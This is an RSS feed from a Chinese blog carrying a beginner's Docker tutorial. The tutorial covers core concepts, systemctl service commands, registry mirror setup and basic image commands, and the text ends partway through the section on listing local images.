<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on kakahuote</title>
        <link>https://blog.928330.xyz/post/</link>
        <description>Recent content in Posts on kakahuote</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Example Person</copyright>
        <lastBuildDate>Wed, 23 Jul 2025 19:32:49 +0800</lastBuildDate><atom:link href="https://blog.928330.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>快速上手docker</title>
        <link>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8Bdocker/</link>
        <pubDate>Wed, 23 Jul 2025 19:24:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8Bdocker/</guid>
        <description>&lt;p&gt;&lt;span style=&#34;color:aqua;font-size:20px&#34;&gt;本教程针对的是linux环境下的docker&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;docker简介&#34;&gt;Docker简介
&lt;/h1&gt;&lt;h2 id=&#34;什么是docker&#34;&gt;什么是Docker
&lt;/h2&gt;&lt;p&gt;Docker是一个开源的容器化平台，旨在简化应用程序的开发、交付和运行&lt;/p&gt;
&lt;p&gt;它允许开发者将应用程序及其所有依赖项打包到一个轻量级的、可移植的容器中，从而确保在不同环境中都能一致地运行&lt;/p&gt;
&lt;p&gt;容器之间是隔离的，像一个个小型的沙箱&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一句话&lt;/strong&gt;：Docker就像一个轻量级虚拟机，可以在不同的环境中快速部署运行同样的应用程序&lt;/p&gt;
&lt;h2 id=&#34;docker的主要概念&#34;&gt;Docker的主要概念
&lt;/h2&gt;&lt;h3 id=&#34;容器container&#34;&gt;容器（Container）
&lt;/h3&gt;&lt;p&gt;容器是Docker的核心，&lt;strong&gt;它就像是一个隔离的小程序环境，打包了应用运行所需的一切&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;与传统虚拟机相比，容器不需要包含整个操作系统，只共享宿主机内核，因此占用资源小、启动速度快&lt;/p&gt;
&lt;p&gt;无论在本地、测试环境，还是部署到服务器，运行结果都一致&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每个容器互相隔离，修改不会影响宿主机或其他容器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如，运行一个Python应用的容器，就像在一个只包含Python的迷你Linux系统里运行它&lt;/p&gt;
&lt;h3 id=&#34;镜像image&#34;&gt;镜像（Image）
&lt;/h3&gt;&lt;p&gt;镜像是构建容器的模板或快照，可以理解为包含了&lt;strong&gt;系统环境+应用程序代码+配置&lt;/strong&gt;的“包”&lt;/p&gt;
&lt;p&gt;镜像一经创建就不变，部署更可靠&lt;/p&gt;
&lt;p&gt;比如我们下载&lt;code&gt;nginx&lt;/code&gt;这个镜像，然后就能启动一个&lt;code&gt;nginx&lt;/code&gt;容器，&lt;strong&gt;就像虚拟机的快照和启动运行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;即使我们更改了容器，镜像也不会改变，我们也可以把改动的容器制作为新的镜像，类似拍摄快照&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个镜像可以启动成多个容器，就像一个类能被实例化成多个对象&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;dockerfile&#34;&gt;Dockerfile
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;它是用来构建镜像的配置脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;里面写入了构建命令，如基于哪个镜像、复制哪些文件、安装哪些软件等&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;docker build&lt;/code&gt;命令可以将&lt;code&gt;Dockerfile&lt;/code&gt;构建成镜像，然后启动对应的容器&lt;/p&gt;
&lt;h3 id=&#34;仓库registry&#34;&gt;仓库（Registry）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;存储和分发镜像的平台&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如DockerHub，就是Docker官方提供的镜像仓库平台（类似GitHub），有很多官方镜像可以免费下载&lt;/p&gt;
&lt;h1 id=&#34;systemctl命令使用&#34;&gt;systemctl命令使用
&lt;/h1&gt;&lt;p&gt;&lt;code&gt;systemctl&lt;/code&gt;是现代Linux发行版中核心的系统和服务管理器&lt;/p&gt;
&lt;p&gt;它负责启动、停止、检查和管理系统上的各种后台服务（也称为守护进程）&lt;/p&gt;
&lt;p&gt;在使用任何Docker命令之前，必须确保Docker的后台服务正在运行&lt;/p&gt;
&lt;p&gt;接下来我们将以Docker服务为例结合介绍它的各种命令&lt;/p&gt;
&lt;h2 id=&#34;服务的生命周期管理&#34;&gt;服务的生命周期管理
&lt;/h2&gt;&lt;p&gt;这是 &lt;code&gt;systemctl&lt;/code&gt;最核心的功能，用于控制一个服务的运行、停止和重启等&lt;/p&gt;
&lt;h3 id=&#34;启动服务&#34;&gt;启动服务
&lt;/h3&gt;&lt;p&gt;当一个服务处于停止状态时，使用&lt;code&gt;start&lt;/code&gt;命令来启动它&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令会启动Docker服务，Docker守护进程会在后台开始运行，准备接收和处理Docker相关的命令&lt;/p&gt;
&lt;p&gt;通常执行此类操作需要管理员权限&lt;/p&gt;
&lt;h3 id=&#34;停止服务&#34;&gt;停止服务
&lt;/h3&gt;&lt;p&gt;停止一个正在运行的服务&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl stop 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl stop docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令会向Docker服务发送停止信号，使其安全地终止&lt;/p&gt;
&lt;p&gt;对于Docker来说，这意味着Docker守护进程会关闭，所有通过该守护进程运行的容器也会停止&lt;/p&gt;
&lt;h3 id=&#34;重启服务&#34;&gt;重启服务
&lt;/h3&gt;&lt;p&gt;这是一个便捷的组合命令，相当于先停止服务再立即启动它&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这在修改了服务的配置文件后，需要让新配置生效时非常有用&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl restart 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl restart docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果修改了Docker的配置文件（例如 &lt;code&gt;/etc/docker/daemon.json&lt;/code&gt;），执行此命令会重启 Docker 服务，使其加载并应用新的配置&lt;/p&gt;
&lt;h3 id=&#34;重新加载服务配置&#34;&gt;重新加载服务配置
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在不中断服务的情况下，重新加载其配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl reload 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl reload docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令比&lt;code&gt;restart&lt;/code&gt;更为温和，它会请求服务重新读取其配置文件，而不会终止正在运行的主进程&lt;/p&gt;
&lt;p&gt;但是，并非所有服务都支持&lt;code&gt;reload&lt;/code&gt;操作，如果服务不支持此操作，&lt;code&gt;systemctl&lt;/code&gt;可能会转而执行&lt;code&gt;restart&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker服务通常建议使用&lt;code&gt;restart&lt;/code&gt;而不是&lt;code&gt;reload&lt;/code&gt;来应用配置更改&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;服务的状态与信息查看&#34;&gt;服务的状态与信息查看
&lt;/h2&gt;&lt;h3 id=&#34;查看服务详细状态&#34;&gt;查看服务详细状态
&lt;/h3&gt;&lt;p&gt;获取一个服务的全面信息，包括它是否正在运行、最近的日志、进程ID (PID) 等&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl status 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl status docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是排查服务问题的首选&lt;/p&gt;
&lt;p&gt;它会清晰地显示服务的&lt;code&gt;active&lt;/code&gt;状态，如 &lt;code&gt;active (running)&lt;/code&gt; 或 &lt;code&gt;inactive (dead)&lt;/code&gt;），并附带最近几条相关的日志记录&lt;/p&gt;
&lt;h3 id=&#34;检查服务是否正在运行&#34;&gt;检查服务是否正在运行
&lt;/h3&gt;&lt;p&gt;快速检查一个服务当前是否处于活动状态&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl is-active 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl is-active docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令的返回值非常简洁：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务正在运行，它会输出&lt;code&gt;active&lt;/code&gt;并返回状态码 0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务未运行，它会输出&lt;code&gt;inactive&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这在编写自动化脚本时很有用，可以根据返回值来判断是否需要执行某些操作&lt;/p&gt;
&lt;h2 id=&#34;服务的开机自启动管理&#34;&gt;服务的开机自启动管理
&lt;/h2&gt;&lt;h3 id=&#34;设置开机自启动&#34;&gt;设置开机自启动
&lt;/h3&gt;&lt;p&gt;将一个服务设置为在系统启动时自动运行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl &lt;span style=&#34;color:#e5c07b&#34;&gt;enable&lt;/span&gt; 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl &lt;span style=&#34;color:#e5c07b&#34;&gt;enable&lt;/span&gt; docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行此命令后，&lt;code&gt;systemd&lt;/code&gt;会创建必要的符号链接，确保下次系统启动时，Docker服务会自动启动&lt;/p&gt;
&lt;p&gt;这是一个一次性的设置，之后无需再手动启动&lt;/p&gt;
&lt;h3 id=&#34;禁止开机自启动&#34;&gt;禁止开机自启动
&lt;/h3&gt;&lt;p&gt;取消一个服务的开机自启动设置&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl disable 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl disable docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令会移除&lt;code&gt;enable&lt;/code&gt;命令创建的符号链接，下次系统重启后，Docker服务将不会自动运行&lt;/p&gt;
&lt;p&gt;这并不会影响当前正在运行的服务状态&lt;/p&gt;
&lt;h3 id=&#34;检查服务是否开机自启动&#34;&gt;检查服务是否开机自启动
&lt;/h3&gt;&lt;p&gt;查看一个服务当前是否被设置为开机自启动&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl is-enabled 服务名称
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl is-enabled docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令会返回 &lt;code&gt;enabled&lt;/code&gt; (已设置) 或 &lt;code&gt;disabled&lt;/code&gt; (未设置)&lt;/p&gt;
&lt;h1 id=&#34;docker更改源&#34;&gt;Docker更改源
&lt;/h1&gt;&lt;p&gt;不知道为什么国内忽然无法访问官方的镜像仓库了，为了加快Docker镜像的下载速度，我们通常需要将 Docker的默认源&lt;code&gt;registry.docker.io&lt;/code&gt;更换为国内的镜像加速源&lt;/p&gt;
&lt;h2 id=&#34;检查安装状态&#34;&gt;检查安装状态
&lt;/h2&gt;&lt;p&gt;首先要确认你的系统已正确安装了Docker，可以执行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker --version
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回的是docker版本，确认无误后继续&lt;/p&gt;
&lt;h2 id=&#34;编辑配置文件&#34;&gt;编辑配置文件
&lt;/h2&gt;&lt;p&gt;Docker 的镜像源配置文件通常位于&lt;code&gt;/etc/docker/daemon.json&lt;/code&gt;，如果文件不存在，可以手动创建&lt;/p&gt;
&lt;p&gt;使用任意文本编辑器打开，例如使用vim（不知道怎么使用vim的可以看一眼：&lt;a class=&#34;link&#34; href=&#34;http://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;vim使用教程
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim /etc/docker/daemon.json
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后将内容修改为以下格式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e06c75&#34;&gt;&amp;#34;registry-mirrors&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;https://&amp;lt;加速地址1&amp;gt;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;https://&amp;lt;加速地址2&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然你还能添加更多加速地址，但是注意最后一个加速地址后面就不能有逗号了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b站up:大海资源&lt;/strong&gt;整理的当前可用的国内镜像源：https://www.dhzy.fun/archives/6852.html&lt;/p&gt;
&lt;h2 id=&#34;重启服务-1&#34;&gt;重启服务
&lt;/h2&gt;&lt;p&gt;修改完配置后，需要重启 Docker 服务以使配置生效：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl restart docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;验证是否生效&#34;&gt;验证是否生效
&lt;/h2&gt;&lt;p&gt;可以执行如下命令查看当前镜像加速器配置是否生效：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker info | grep -A &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Registry Mirrors&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从输出中查找包含&lt;code&gt;Registry Mirrors&lt;/code&gt;的那一行，并显示它后面10行&lt;/p&gt;
&lt;p&gt;如果是下面这样的输出，说明配置成功了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722202433203.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722202433203&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h2&gt;&lt;p&gt;修改配置文件时要确保JSON格式正确，例如逗号不能多不能少&lt;/p&gt;
&lt;p&gt;有些加速源如阿里云需要登录账号并绑定使用，获取专属地址&lt;/p&gt;
&lt;p&gt;如果使用的是非systemd系统，要使用service命令重启Docker&lt;/p&gt;
&lt;h1 id=&#34;docker使用&#34;&gt;Docker使用
&lt;/h1&gt;&lt;h2 id=&#34;镜像管理&#34;&gt;镜像管理
&lt;/h2&gt;&lt;h3 id=&#34;查找镜像&#34;&gt;查找镜像
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker search &amp;lt;镜像名称&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;docker search&lt;/code&gt;使用的是DockerHub的HTTP API，没有镜像源概念，无法走国内加速&lt;/p&gt;
&lt;p&gt;如果无法访问，必须使用代理，或者通过别的方式访问官网：https://hub.docker.com/&lt;/p&gt;
&lt;h3 id=&#34;拉取镜像&#34;&gt;拉取镜像
&lt;/h3&gt;&lt;p&gt;从仓库中下载一个镜像到你的本地机器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker pull &amp;lt;镜像名称&amp;gt;:&amp;lt;标签&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;镜像名称&lt;/strong&gt;：想要下载的软件，例如&lt;code&gt;nginx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;标签&lt;/strong&gt; ：通常用来表示软件的版本，例如&lt;code&gt;latest&lt;/code&gt;表示最新版，&lt;code&gt;1.21&lt;/code&gt;表示特定版本&lt;/p&gt;
&lt;p&gt;​           如果省略标签，Docker 会默认使用&lt;code&gt;latest&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker pull nginx:latest
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此命令会从镜像源下载最新版本的Nginx镜像&lt;/p&gt;
&lt;h3 id=&#34;查看本地镜像&#34;&gt;查看本地镜像
&lt;/h3&gt;&lt;p&gt;列出所有已经下载到本地计算机上的镜像&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker images
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722204915819.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722204915819&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;REPOSITORY&lt;/strong&gt;：仓库名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TAG&lt;/strong&gt; ：标签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IMAGE ID&lt;/strong&gt;：镜像的唯一ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CREATED&lt;/strong&gt;：创建时间&lt;/p&gt;
